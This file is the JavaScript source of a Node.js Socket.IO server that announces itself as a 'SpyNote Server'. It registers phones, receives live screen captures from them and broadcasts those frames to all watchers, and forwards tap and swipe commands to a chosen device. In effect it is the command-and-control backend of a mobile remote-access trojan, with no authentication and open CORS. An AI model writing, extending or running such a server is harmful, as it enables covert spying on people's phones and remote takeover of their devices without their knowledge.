const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 10000,
    pingInterval: 5000,
    maxHttpBufferSize: 100 * 1024 * 1024
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ limit: '100mb', extended: true }));

const devices = new Map();
const deviceSockets = new Map(); // 🔥 NEW: Track device sockets

app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status } = req.body;
    if (deviceId) {
        devices.set(deviceId, { model, brand, version, status, connected: true });
        io.emit('devices-update', Array.from(devices.entries()));
        console.log("✅ Device registered:", deviceId);
    }
    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id 
            });
            deviceSockets.set(deviceId, socket.id); // 🔥 Track socket
            socket.join(deviceId); // 🔥 Device joins its own room
            io.emit('devices-update', Array.from(devices.entries()));
            console.log("📱 Device registered:", deviceId, "Socket:", socket.id);
        }
    });

    // 🔥 FIXED: Screen streaming - Broadcast to ALL clients watching this device
    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        console.log('📺 Frame received from:', deviceId, 'Size:', Math.round(data.data.length/1024)+'KB');
        
        if (devices.has(deviceId)) {
            // 🔥 Broadcast to ALL clients (NOT just device room)
            socket.broadcast.emit('screen-update', {
                deviceId,
                data: data.data,
                width: data.width,
                height: data.height,
                timestamp: data.timestamp
            });
            console.log('✅ Frame broadcasted to web clients');
        }
    });

    // 🔥 Control commands - Send to SPECIFIC device socket/room
    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
        console.log('🎮 Control to', deviceId, ':', action);
        
        if (devices.has(deviceId)) {
            // Send to device's specific socket/room
            io.to(deviceId).emit('control', {
                action, 
                x: parseFloat(x)||0, 
                y: parseFloat(y)||0,
                startX: parseFloat(startX)||0, 
                startY: parseFloat(startY)||0,
                endX: parseFloat(endX)||0, 
                endY: parseFloat(endY)||0
            });
        }
    });

    socket.on('disconnect', () => {
        console.log('🔌 Client disconnected:', socket.id);
        // Update device status
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                deviceSockets.delete(deviceId);
                io.emit('devices-update', Array.from(devices.entries()));
                console.log('📱 Device disconnected:', deviceId);
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SpyNote Server: http://localhost:${PORT}`);
    console.log(`📱 Multi-device ready!`);
});
